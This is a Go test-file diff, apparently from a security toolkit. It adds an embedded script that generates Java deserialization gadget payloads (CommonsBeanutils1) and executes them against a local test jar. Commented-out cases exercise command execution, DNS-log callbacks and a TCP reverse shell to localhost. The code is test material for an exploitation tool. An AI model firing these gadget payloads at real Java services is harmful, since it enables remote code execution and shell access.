@@ -79,3 +79,95 @@ func TestGadgetBaseExternalJarTool(t *testing.T) {
 		t.Fatal(err)
 	}
 }
+
+const classTestCode = `
+execPayload = (arg...) => {
+	gadgetIns = yso.GetGadget("CommonsBeanutils1",arg...)~
+	payload = yso.ToBytes(gadgetIns)~
+	payloadBase64 = codec.EncodeBase64(payload)~
+	cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar' -jar /tmp/yak-yso-tester.jar '%s'"%[payloadBase64]
+	exec.System(cmd)
+println(cmd)
+}
+// DNSLog
+//domain,token = risk.NewDNSLogDomain()~
+//execPayload(yso.useDNSLogEvilClass(domain))
+//_,err =risk.CheckDNSLogByToken(token, 3)
+//if err {
+//    panic("not found record")
+//}
+// RuntimeExec
+//randomstr = str.RandStr(8)
+//path = "/tmp/%s" % randomstr
+//execPayload(yso.useRuntimeExecEvilClass("touch "+path))
+//if !file.IsExisted(path){
+//	panic("not found file")
+//}
+//file.Remove(path)
+//// ProcessBuilderExec
+//randomstr = str.RandStr(8)
+//path = "/tmp/%s" % randomstr
+//execPayload(yso.useProcessBuilderExecEvilClass("touch "+path))
+//if !file.IsExisted(path){
+//	panic("not found file")
+//}
+//file.Remove(path)
+//// ProcessImplExec
+//randomstr = str.RandStr(8)
+//path = "/tmp/%s" % randomstr
+//execPayload(yso.useProcessImplExecEvilClass("touch "+path))
+//if !file.IsExisted(path){
+//	panic("not found file")
+//}
+//file.Remove(path)
+
+// TODO: build a jar for auto test web env
+// ModifyTomcatMaxHeaderSize 
+//execPayload(yso.useModifyTomcatMaxHeaderSizeTemplate())
+// TcpReverse
+//host = "127.0.0.1"
+//port = os.GetRandomAvailableTCPPort()
+//token = str.RandStr(8)
+//recvToken = ""
+//go tcp.Serve(host, port, tcp.serverCallback(conn=>{
+//	conn.SetTimeout(3)
+//	byt = conn.Recv()~
+//	recvToken = str.TrimSpace(string(byt))
+//}))
+//execPayload(yso.useTcpReverseEvilClass(host,port),yso.tcpReverseToken(token))
+//sleep(0.5)
+//recvToken = recvToken[2:]
+//if recvToken != token {
+//	panic("not found token")
+//}
+//host = "127.0.0.1"
+//port = os.GetRandomAvailableTCPPort()
+//recvToken = ""
+//go tcp.Serve(host, port, tcp.serverCallback(conn=>{
+//	conn.Send("echo -n 'hello'|md5|cut -d ' ' -f1")
+//	conn.SetTimeout(3)
+//	byt = conn.Recv()~
+//	dump(byt)
+//	recvToken = str.TrimSpace(string(byt))
+//	conn.Close()
+//}))
+//execPayload(yso.useTcpReverseShellEvilClass(host,port))
+//sleep(0.5)
+//dump(recvToken)
+
+execPayload(yso.useSleepTime(10000),yso.useSleepTemplate())
+`
+
+func TestClassesBaseExternalJarTool(t *testing.T) {
+	_, err := yak.Execute(classTestCode, map[string]any{
+		"reportFailedGadget": func(gs any) {
+			failedGadgets := utils.InterfaceToSliceInterface(gs)
+			if len(failedGadgets) > 0 {
+				t.Fatalf("failed gadgets: %v", failedGadgets)
+			}
+		},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+}
